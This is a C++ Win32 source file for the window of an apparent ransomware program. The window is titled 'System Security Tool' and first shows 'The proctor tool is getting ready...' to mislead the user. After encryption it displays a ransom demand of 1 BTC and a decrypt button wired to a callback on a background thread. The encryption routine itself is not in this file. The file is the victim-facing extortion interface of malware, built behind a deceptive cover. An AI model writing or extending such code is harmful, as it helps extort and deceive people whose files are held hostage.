#include "gui.h"
#include <commctrl.h>
#include <thread>

// Custom Windows message for encryption completion
#define WM_ENCRYPTION_COMPLETE (WM_USER + 1)

// Add a new custom message for decryption completion
#define WM_DECRYPTION_COMPLETE (WM_USER + 2)

// Initialize static member
GUI* GUI::instance = nullptr;

GUI::GUI() : hwnd(NULL), btnDecrypt(NULL) {
    instance = this;
}

GUI::~GUI() {
    instance = nullptr;
}

bool GUI::initialize(HINSTANCE hInstance) {
    // Initialize common controls
    INITCOMMONCONTROLSEX icc;
    icc.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icc.dwICC = ICC_STANDARD_CLASSES;
    InitCommonControlsEx(&icc);
    
    // Register window class
    const wchar_t CLASS_NAME[] = L"FileEncryptorWindow";
    
    WNDCLASSEXW wc = {};  // Initialize all fields to zero
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszClassName = CLASS_NAME;
    
    if (!RegisterClassExW(&wc)) {
        MessageBoxW(NULL, L"Window Registration Failed!", L"Error", MB_ICONEXCLAMATION | MB_OK);
        return false;
    }
    
    // Create window
    hwnd = CreateWindowExW(
        0,                              // Optional window styles
        CLASS_NAME,                     // Window class
        L"System Security Tool",        // Window title
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,  // Window style
        
        // Size and position
        CW_USEDEFAULT, CW_USEDEFAULT, 500, 250,
        
        NULL,       // Parent window
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
    );
    
    if (hwnd == NULL) {
        MessageBoxW(NULL, L"Window Creation Failed!", L"Error", MB_ICONEXCLAMATION | MB_OK);
        return false;
    }
    
    // Center window on screen
    RECT rc;
    GetWindowRect(hwnd, &rc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    int winWidth = rc.right - rc.left;
    int winHeight = rc.bottom - rc.top;
    int xPos = (screenWidth - winWidth) / 2;
    int yPos = (screenHeight - winHeight) / 2;
    
    SetWindowPos(hwnd, NULL, xPos, yPos, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
    
    // Show window
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    
    return true;
}

void GUI::showStartMessage() {
    // Clear the window by destroying all child windows
    EnumChildWindows(hwnd, [](HWND hwndChild, LPARAM /*lParam*/) -> BOOL {
        DestroyWindow(hwndChild);
        return TRUE;
    }, 0);
    
    // Create a static text control for the message
    CreateWindowExW(
        0, L"STATIC", L"The proctor tool is getting ready...",
        WS_VISIBLE | WS_CHILD | SS_CENTER,
        50, 100, 400, 30,
        hwnd, (HMENU)1, NULL, NULL
    );
    
    UpdateWindow(hwnd);
}

void GUI::showCompletionMessage() {
    // Check if we're on the UI thread
    if (GetCurrentThreadId() != GetWindowThreadProcessId(hwnd, NULL)) {
        // Post a message to the window to call this function on the UI thread
        PostMessage(hwnd, WM_ENCRYPTION_COMPLETE, 0, 0);
        return;
    }

    // Now we're on the UI thread, safe to update UI
    // Clear the window by destroying all child windows
    EnumChildWindows(hwnd, [](HWND hwndChild, LPARAM /*lParam*/) -> BOOL {
        DestroyWindow(hwndChild);
        return TRUE;
    }, 0);
    
    // Create a static text control for the message
    CreateWindowExW(
        0, L"STATIC", L"Your files have been encrypted! Pay 1BTC to us to decrypt your files!",
        WS_VISIBLE | WS_CHILD | SS_CENTER,
        20, 80, 460, 30,
        hwnd, (HMENU)1, NULL, NULL
    );
    
    // Create a decrypt button
    btnDecrypt = CreateWindowExW(
        0, L"BUTTON", L"Decrypt Files",
        WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        200, 150, 100, 30,
        hwnd, (HMENU)2, NULL, NULL
    );
    
    UpdateWindow(hwnd);
}

// Add a new method to show decryption status
void GUI::showDecryptingMessage() {
    // Check if we're on the UI thread
    if (GetCurrentThreadId() != GetWindowThreadProcessId(hwnd, NULL)) {
        // Post a message to the window to call this function on the UI thread
        PostMessage(hwnd, WM_COMMAND, MAKEWPARAM(3, BN_CLICKED), 0);
        return;
    }

    // Now we're on the UI thread, safe to update UI
    // Clear the window by destroying all child windows
    EnumChildWindows(hwnd, [](HWND hwndChild, LPARAM /*lParam*/) -> BOOL {
        DestroyWindow(hwndChild);
        return TRUE;
    }, 0);
    
    // Create a static text control for the message
    CreateWindowExW(
        0, L"STATIC", L"Decrypting your files, please wait...",
        WS_VISIBLE | WS_CHILD | SS_CENTER,
        50, 100, 400, 30,
        hwnd, (HMENU)1, NULL, NULL
    );
    
    UpdateWindow(hwnd);
}

// Add a method to show decryption completion
void GUI::showDecryptionComplete() {
    // Check if we're on the UI thread
    if (GetCurrentThreadId() != GetWindowThreadProcessId(hwnd, NULL)) {
        // Post a message to the window to call this function on the UI thread
        PostMessage(hwnd, WM_DECRYPTION_COMPLETE, 0, 0);
        return;
    }

    // Now we're on the UI thread, safe to update UI
    // Clear the window by destroying all child windows
    EnumChildWindows(hwnd, [](HWND hwndChild, LPARAM /*lParam*/) -> BOOL {
        DestroyWindow(hwndChild);
        return TRUE;
    }, 0);
    
    // Create a static text control for the message
    CreateWindowExW(
        0, L"STATIC", L"Your files have been successfully decrypted!",
        WS_VISIBLE | WS_CHILD | SS_CENTER,
        50, 100, 400, 30,
        hwnd, (HMENU)1, NULL, NULL
    );
    
    // Create a close button
    btnDecrypt = CreateWindowExW(
        0, L"BUTTON", L"Close",
        WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        200, 150, 100, 30,
        hwnd, (HMENU)4, NULL, NULL
    );
    
    UpdateWindow(hwnd);
}

void GUI::close() {
    if (hwnd != NULL) {
        DestroyWindow(hwnd);
        hwnd = NULL;
    }
}

void GUI::setDecryptCallback(std::function<void()> callback) {
    decryptCallback = std::move(callback);
}

// Add a method to notify when decryption is complete
void GUI::notifyDecryptionComplete() {
    showDecryptionComplete();
}

LRESULT CALLBACK GUI::WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_ENCRYPTION_COMPLETE:
            // Handle the custom message for encryption completion
            if (instance) {
                instance->showCompletionMessage();
            }
            return 0;
            
        case WM_DECRYPTION_COMPLETE:
            // Handle the custom message for decryption completion
            if (instance) {
                instance->showDecryptionComplete();
            }
            return 0;

        case WM_COMMAND:
            // Check if decrypt button was clicked
            if (LOWORD(wParam) == 2 && HIWORD(wParam) == BN_CLICKED) {
                if (instance && instance->decryptCallback) {
                    // Show decrypting message
                    instance->showDecryptingMessage();
                    
                    // Run the decrypt function in a separate thread
                    std::thread decryptThread([instance = instance]() {
                        // Execute the decryption
                        if (instance->decryptCallback) {
                            instance->decryptCallback();
                        }
                        
                        // When done, notify the UI
                        instance->notifyDecryptionComplete();
                    });
                    decryptThread.detach(); // Let it run independently
                }
            }
            // Check if the "3" button was clicked (internal for showing decrypt message)
            else if (LOWORD(wParam) == 3 && HIWORD(wParam) == BN_CLICKED) {
                if (instance) {
                    instance->showDecryptingMessage();
                }
            }
            // Check if close button was clicked
            else if (LOWORD(wParam) == 4 && HIWORD(wParam) == BN_CLICKED) {
                if (instance) {
                    instance->close();
                }
            }
            break;
            
        case WM_CLOSE:
            DestroyWindow(hwnd);
            return 0;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// Global function to run the GUI application
int RunGUIApplication(HINSTANCE hInstance) {
    GUI gui;
    
    if (!gui.initialize(hInstance)) {
        return 1;
    }
    
    // Message loop
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return (int)msg.wParam;
}
